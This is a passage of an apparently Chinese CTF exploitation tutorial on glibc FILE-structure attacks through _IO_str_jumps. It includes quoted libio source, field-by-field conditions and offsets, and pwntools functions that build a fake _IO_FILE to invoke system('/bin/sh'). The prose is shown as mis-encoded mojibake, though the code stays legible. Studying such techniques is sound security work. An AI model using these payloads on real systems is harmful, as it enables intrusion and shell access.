è¿™ç±»å‡½æ•°ã€‚</p><p>ç›¸æ¯” 2.23 ï¼Œæœ€é‡è¦çš„å°±æ˜¯<strong>å¯¹ <code>_flags</code> æ¯”è¾ƒä¸¥æ ¼</strong>ï¼Œè¿™é‡Œéœ€è¦ç‚¹ç¯‡å¹…çœ‹æºç æ‰èƒ½è¯´æ˜ç™½ã€‚</p><h3 id="IO-str-jumps"><a class="header-anchor" href="#IO-str-jumps">Â¶</a>_IO_str_jumps</h3><p>å°±æ˜¯ä¸€å¼  vtable å‡½æ•°è¡¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_str_finish),<br>  JUMP_INIT(overflow, _IO_str_overflow),<br>  JUMP_INIT(underflow, _IO_str_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>  JUMP_INIT(xsputn, _IO_default_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_str_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_default_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="IO-str-finish"><a class="header-anchor" href="#IO-str-finish">Â¶</a>_IO_str_finish</h3><p>è¿™ç©æ„æ¯”è¾ƒç®€å•ï¼Œå…ˆè¯´ä¸€ä¸‹ã€‚</p><p>æˆ‘ä»¬ä»ç„¶éœ€è¦æ„é€ å¥½æ¡ä»¶ï¼Œè¿›å…¥è¢«ä¿®æ”¹åçš„ vtable è¡¨ <code>_IO_OVERFLOW</code> åç§»å¤„çš„å‡½æ•°ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¿™é‡Œçš„ <code>_IO_str_finish</code>ã€‚</p><p>æ‰€ä»¥ 2.23 é‚£é‡Œçš„<strong>æ¡ä»¶è¿˜æ˜¯ä¸èƒ½ä¸¢</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>è¿›å…¥å‡½æ•°åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¥½çš„ï¼Œæ¯”è¾ƒæ•æ„Ÿçš„è§‚ä¼—æœ‹å‹ä»¬å·²ç»å‘ç°äº†åç‚¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br></code></pre></td></tr></table></figure><p>è¿™ç©æ„ï¼Œå¸¦äº†å‡½æ•°æŒ‡é’ˆï¼Œå¾ˆå¥½ç”¨ã€‚åªè¦æŠŠè¿™ä¸ª <code>_free_buffer</code> æ‰¬æˆ <code>system</code> ï¼Œ<code>fp-&gt;_IO_buf_base</code> å†™ <code>/bin/sh\0</code> åœ°å€ï¼Œå‰©ä¸‹çš„ <strong>dddd</strong>ã€‚</p><p>è¿™é‡Œ <strong>_s</strong> æ˜¯ä»€ä¹ˆ ğŸ‘´ ç¿»äº†ä¸€å¤§åŠå¤©æºç ä¹Ÿæ²¡å¼„æ˜ç™½è¿™ç©æ„ï¼Œäºæ˜¯å°±æ‘†äº†ã€‚åæ­£ <code>fp-&gt;_s._free_buffer</code> æ˜¯ <strong>fp åŠ ä¸€ä¸ªåç§»</strong>ã€‚å…·ä½“çš„ ğŸ‘´ æœ‰ gdb å¯ä»¥è°ƒã€‚ğŸ‘´ æµ‹å¾—åœ¨ x64 ä¸‹æ˜¯ <strong>0xe8</strong>ã€‚</p><p>å¥½çš„ï¼Œæ€»ç»“ä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span> <span class="hljs-comment">// 2.23</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base <span class="hljs-comment">// 2.23</span><br>fp-&gt;vtable = _IO_str_jumps_addr<br>fp-&gt;_flags &amp; _IO_USER_BUF = <span class="hljs-number">0</span> <span class="hljs-comment">// æœ€ä½ä½æ²¡æœ‰ 1 </span><br>fp-&gt;_IO_buf_base != <span class="hljs-number">0</span><br>---&gt; fp-&gt;_IO_buf_base = binsh_addr<br>fp-&gt;_s._free_buffer = system_addr <br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br></code></pre></td></tr></table></figure><h3 id="IO-str-overflow"><a class="header-anchor" href="#IO-str-overflow">Â¶</a>_IO_str_overflow</h3><p>è¿™æ˜¯ä¸ªæ¯”è¾ƒå¤æ‚åŒæ—¶å¾ˆé‡è¦çš„å‡½æ•°ï¼Œåé¢æˆ‘ä»¬ä¹Ÿä¼šç”¨åˆ°è¿™ä¸ªå‡½æ•°ï¼ˆHosue of Pigï¼‰ã€‚</p><p>æˆ‘ä»¬ä»ç„¶éœ€è¦æ„é€ å¥½æ¡ä»¶ï¼Œè¿›å…¥è¢«ä¿®æ”¹åçš„ vtable è¡¨ <code>_IO_OVERFLOW</code> åç§»å¤„çš„å‡½æ•°ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¿™é‡Œçš„ <code>_IO_str_overflow</code>ã€‚</p><p>æ‰€ä»¥ 2.23 é‚£é‡Œçš„<strong>æ¡ä»¶è¿˜æ˜¯ä¸èƒ½ä¸¢</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>è¿›å…¥å‡½æ•°åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_str_overflow (_IO_FILE *fp, <span class="hljs-type">int</span> c)<br>&#123;<br>  <span class="hljs-type">int</span> flush_only = c == EOF;<br>  _IO_size_t pos;<br>    <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>    <br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br>    <br>  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br><span class="hljs-keyword">return</span> EOF;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-type">char</span> *new_buf;<br>  <span class="hljs-type">char</span> *old_buf = fp-&gt;_IO_buf_base;<br>  <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>  _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br>  <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>    <span class="hljs-keyword">return</span> EOF;<br>  new_buf<br>    = (<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br>  <span class="hljs-keyword">if</span> (new_buf == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/*  __ferror(fp) = 1; */</span><br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (old_buf)<br>    &#123;<br>      <span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);<br>      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);<br>      <span class="hljs-comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span><br>      fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  <span class="hljs-built_in">memset</span> (new_buf + old_blen, <span class="hljs-string">&#x27;\0&#x27;</span>, new_size - old_blen);<br><br>  _IO_setb (fp, new_buf, new_buf + new_size, <span class="hljs-number">1</span>);<br>  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);<br>  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);<br>  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);<br>  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);<br><br>  fp-&gt;_IO_write_base = new_buf;<br>  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (!flush_only)<br>    *fp-&gt;_IO_write_ptr++ = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) c;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)<br>    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">return</span> c;<br>&#125;<br>libc_hidden_def (_IO_str_overflow)<br></code></pre></td></tr></table></figure><p>ğŸ‘´ çŸ¥é“å¤§ ğŸ”¥ ä¸€çœ¼æœ›å»ç›´æ¥ä¸æƒ³çœ‹äº†ï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€è¦ç›¯å‡ ä¸ªç‚¹å°±å¥½äº†ã€‚</p><p><strong>é¦–å…ˆæ˜¯æˆ‘ä»¬çš„ç›®æ ‡</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">new_buf = (<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br></code></pre></td></tr></table></figure><p><code>fp-&gt;_s._allocate_buffer</code> å†™ system çš„åœ°å€ï¼Œ<code>new_size</code> æ„é€ æˆ binsh çš„åœ°å€ã€‚</p><p>å…¶ä¸­ <code>fp-&gt;_s._allocate_buffer</code> æ˜¯ fp åŠ ä¸€ä¸ªåç§»ï¼ŒğŸ‘´ æµ‹å¾—åœ¨ x64 ä¸‹æ˜¯ <strong>0xe0</strong>ï¼Œ new_size è®¡ç®—å¦‚ä¸‹ï¼š</p><p>å½“ binsh_addr ä¸º<strong>å¶æ•°</strong>çš„è¯å°±æ˜¯å°å­¦æ•°å­¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>  _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br></code></pre></td></tr></table></figure><p>$$<br>2 * old_blen + 100 = binsh_addr\<br>(fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base=\<br>old_blen=(binsh_addr-100)//2<br>$$</p><p>å½“ binsh_addr ä¸º<strong>å¥‡æ•°</strong>ï¼ˆğŸ‘´ æ²¡å’‹é‡è§è¿‡ï¼‰ï¼Œå’±åŠ ä¸€è¯•è¯•çœ‹æ˜Ÿä¸æ˜Ÿï¼Œå®åœ¨ä¸è¡Œå’±ä¸å—è¿™æ°”è‡ªå·±æ‰¾åœ°å€å†™ä¸€ä¸ªå°±  ok ï¼š</p><p><code>0xa = 10</code> æ˜¯å¶æ•°ï¼Œè¿™é‡Œåªæ˜¯å‡è£…æ¼”ç¤ºä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; search /<span class="hljs-built_in">bin</span>/sh<br>libc-<span class="hljs-number">2.27</span>.so    <span class="hljs-number">0x7f463b5cb0fa</span> <span class="hljs-number">0x68732f6e69622f</span> /* <span class="hljs-string">&#x27;/bin/sh&#x27;</span> */<br>pwndbg&gt; x/s <span class="hljs-number">0x7f463b5cb0fa</span>+<span class="hljs-number">1</span><br><span class="hljs-number">0x7f463b5cb0fb</span>: <span class="hljs-string">&quot;bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p><strong>ç„¶åæ˜¯è¾¾æˆç›®æ ‡ï¼Œä½¿è°ƒç”¨æˆ‘ä»¬çš„å‡½æ•°æŒ‡é’ˆï¼Œé¿å… returnï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*[+]----------------1----------------[+]*/</span><br>    <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>    <br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br><span class="hljs-comment">/*[+]----------------1----------------[+]*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8 <span class="hljs-comment">/* Writing not allowd */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="hljs-comment">/* Set if put and get pointer logicly tied. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br></code></pre></td></tr></table></figure><p>å³äºŒè¿›åˆ¶è¡¨ç¤ºçš„ <code>_flags</code> å€’æ•°ç¬¬ä¸‰ä½ä¸èƒ½ä¸º1 ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*[+]----------------2----------------[+]*/</span><br>      <br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br><span class="hljs-keyword">return</span> EOF;<br>      <br><span class="hljs-comment">/*[+]----------------2----------------[+]*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br></code></pre></td></tr></table></figure><p>æ„é€ çš„æ—¶å€™å°å¿ƒç‚¹å°±å¥½äº†ï¼Œæ²¡å•¥å¤§é—®é¢˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<br>    &#123;<br><span class="hljs-comment">/*[+]----------------3----------------[+]*/</span> <br>          <br>  <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>    <span class="hljs-keyword">return</span> EOF;<br>          <br><span class="hljs-comment">/*[+]----------------3----------------[+]*/</span><br></code></pre></td></tr></table></figure><p>1,2 å’‹æ„é€ ï¼ŸğŸ‘´ è¯´ä¿©ä¸ªæ•°ä½ è®°ç€å—·ï¼š <code>0xfbad1800</code>  æˆ– <code>0</code> ç›´æ¥ç»•å®Œï¼Œä¸è¦æèŠ±é‡Œèƒ¡å“¨çš„ã€‚</p><p>è‡³äº 4 ï¼Œè¿™ç©æ„åº”è¯¥æ˜¯é˜²æ­¢ <code>new_size = 2 * old_blen + 100</code> æº¢å‡ºçš„ã€‚ä¸€èˆ¬ä¸ä¼šå‡ºäº‹ã€‚</p><p><strong>æ€»ç»“ä¸€ä¸‹ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><span class="hljs-comment">// 2.23</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<span class="hljs-comment">// 2.23</span><br>fp-&gt;_flags = <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr = <span class="hljs-number">0xffffffffffffffff</span><br>fp-&gt;_s._allocate_buffer = system_addr<br>fp-&gt;_IO_buf_base = <span class="hljs-number">0</span><br>fp-&gt;_IO_buf_end = (binsh_addr<span class="hljs-number">-100</span>)<span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><h3 id="åŸºæœ¬æ„é€ -v2"><a class="header-anchor" href="#åŸºæœ¬æ„é€ -v2">Â¶</a>åŸºæœ¬æ„é€ </h3><h4 id="IO-str-finish-v2"><a class="header-anchor" href="#IO-str-finish-v2">Â¶</a>_IO_str_finish</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(binsh)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps-<span class="hljs-number">8</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(system)<br><span class="hljs-keyword">return</span> fake_IO_FILE<br><br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br></code></pre></td></tr></table></figure><h4 id="IO-str-overflow-v2"><a class="header-anchor" href="#IO-str-overflow-v2">Â¶</a>_IO_str_overflow</h4><p>å…¶å®ä¸Šé¢é‚£ä¸ªå°±å¤Ÿç”¨äº†ï¼Œä½†é˜²æ­¢æœ‰äººè¯´ ğŸ‘´ æ‡’ ğŸ¶ï¼ŒğŸ‘´ è¿˜æ˜¯æ”¹äº†ä¸ªè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base; pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64((binsh-<span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps)<br>fake_IO_FILE += p64(system) <span class="hljs-comment"># 0xe0 _s._allocate_buffer</span><br><span class="hljs-keyword">return</span> fake_IO_FILE<br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br></code></pre></td></tr></table></figure><h3 id="å¦‚ä½•å®šä½-IO-str-jumps-ï¼Ÿ"><a class="header-anchor" href="#å¦‚ä½•å®šä½-IO-str-jumps-ï¼Ÿ">Â¶</a>å¦‚ä½•å®šä½ _IO_str_jumps ï¼Ÿ</h3><p>ğŸ‘´ å¯»æ€ ğŸ‘´ æœ‰äº† libc ï¼Œåç§»åˆç›¸å¯¹å›ºå®šï¼Œ ğŸ‘´ æ›´å–œæ¬¢ç›´æ¥å» gdb è°ƒè¯•ç®—ã€‚</p><p>ä¸‹é¢è¿™æ®µæ˜¯ä»åˆ«çš„å¸ˆå‚…é‚£<strong>CV</strong>çš„ï¼Œä¸å–œæ¬¢æŠ˜è…¾çš„å¸ˆå‚…ä»¬å¯ä»¥çœ‹ä¸‹é¢çš„ã€‚</p><p>ç”±äº <code>_IO_str_jumps</code> ä¸æ˜¯å¯¼å‡ºç¬¦å·ï¼Œå› æ­¤æ— æ³•ç›´æ¥åˆ©ç”¨ pwntool sçš„ <code>libc.sym[&quot;_IO_str_jumps&quot;]</code> è¿›è¡Œå®šä½ï¼Œæˆ‘ä»¬å¯ä»¥è½¬æ¢ä¸€ä¸‹æ€è·¯ï¼Œåˆ©ç”¨ <code>_IO_str_jumps</code>ä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œä¾‹å¦‚ <code>_IO_str_underflow</code> è¿›è¡Œè¾…åŠ©å®šä½ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨gdbå»æŸ¥æ‰¾æ‰€æœ‰åŒ…å«è¿™ä¸ª<code>_IO_str_underflow</code> å‡½æ•°åœ°å€çš„å†…å­˜åœ°å€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p _IO_str_underflow<br>$<span class="hljs-number">1</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="hljs-number">0x7f4d4cf04790</span> &lt;_IO_str_underflow&gt;<br>pwndbg&gt; search -p <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d2240a0</span> <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d224160</span> <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d2245e0</span> <span class="hljs-number">0x7f4d4cf04790</span><br>pwndbg&gt; p &amp;_IO_file_jumps<br>$<span class="hljs-number">2</span> = (&lt;data variable, no debug info&gt; *) <span class="hljs-number">0x7f4d4d224440</span> &lt;_IO_file_jumps&gt;<br></code></pre></td></tr></table></figure><p>å†åˆ©ç”¨ <code>_IO_str_jumps</code> çš„åœ°å€å¤§äº <code>_IO_file_jumps</code> åœ°å€çš„æ¡ä»¶ï¼Œå°±å¯ä»¥é”å®šæœ€åä¸€ä¸ªåœ°å€ä¸ºç¬¦åˆæ¡ä»¶çš„ <code>_IO_str_jumps</code> çš„åœ°å€ï¼Œç”±äº <code>_IO_str_underflow</code> åœ¨<code>_IO_str_jumps</code> çš„åç§»ä¸º0x20ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡º<code>_IO_str_jumps</code> = 0x7f4d4d2245c0ï¼Œå†å‡æ‰libcçš„åŸºåœ°å€ï¼Œå°±å¯ä»¥å¾—åˆ°<code>_IO_str_jumps</code> çš„æ­£ç¡®åç§»ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥ç”¨IDA <a 